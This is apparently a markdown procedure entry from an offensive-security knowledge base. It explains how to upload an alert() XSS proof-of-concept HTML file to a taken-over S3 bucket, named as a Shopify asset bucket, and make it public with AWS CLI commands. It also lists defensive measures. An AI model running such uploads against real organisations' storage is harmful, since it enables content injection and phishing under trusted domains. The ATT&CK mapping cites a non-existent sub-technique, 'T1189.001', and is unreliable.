---
id: proc-uuid-004
tags:
  - xss
  - upload
  - aws-s3
type: procedure
tools:
  - '[[tools/aws-cli]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/aws-upload-file]]'
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T05:32:31.469Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[T1189.001]]'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
---
id: proc-uuid-004
name: Upload-Malicious-Content-to-S3-for-XSS-PoC
type: procedure
verified: false
submitted: false
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
tactics: [[Execution]]
techniques: [[Drive-by Compromise]], [[JavaScript]]
sub_techniques: [[T1189.001]]
tags: xss, upload, aws-s3
platforms: Web, AWS
commands: [[commands/aws-upload-file]]
tools: [[tools/aws-cli]]
---

# Upload-Malicious-Content-to-S3-for-XSS-PoC

## Summary

This procedure uploads attacker-controlled HTML/JavaScript to the hijacked S3 bucket, demonstrating stored XSS or phishing via the subdomain.

## Description

Post-takeover, upload files to serve malicious content under the trusted domain. This can lead to XSS if applications load resources from the subdomain. Requires bucket control; outcomes include executable scripts in user browsers.

## Requirements

1. Control over claimed S3 bucket
2. AWS CLI configured
3. Malicious HTML file prepared

## Defense

Defensive measures and detection strategies:

- Block public access on S3 buckets by default
- Validate resource origins in applications
- Monitor for anomalous uploads to cloud storage

## Objectives

1. Serve arbitrary content from subdomain
2. Execute JavaScript for XSS impact
3. Prove phishing or data interception potential

## Instructions

### Step 1: Prepare PoC File

**Context**: Create HTML with XSS payload.

**Command**:
```bash
echo '<html><body><script>alert("XSS via Subdomain Takeover")</script></body></html>' > xss.html
```

### Step 2: Upload to Bucket

**Context**: Copy file to S3 with public access.

**Command** ([[commands/aws-upload-file]]):
```bash
aws s3 cp xss.html s3://shopify-assets/xss_unguessable3211231232.html
```

> Then set ACL:
```bash
aws s3api put-object-acl --bucket shopify-assets --key xss_unguessable3211231232.html --acl public-read
```

> Access via https://s3.shopify.com/xss_unguessable3211231232.html to verify.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[JavaScript]] JavaScript

### Sub-Techniques

- [[T1189.001]] Stored XSS

## Commands Used

- [[commands/aws-upload-file]]

## Tools Used

- [[tools/aws-cli]]

## Tags

- [[xss]]
- [[upload]]
- [[aws-s3]]
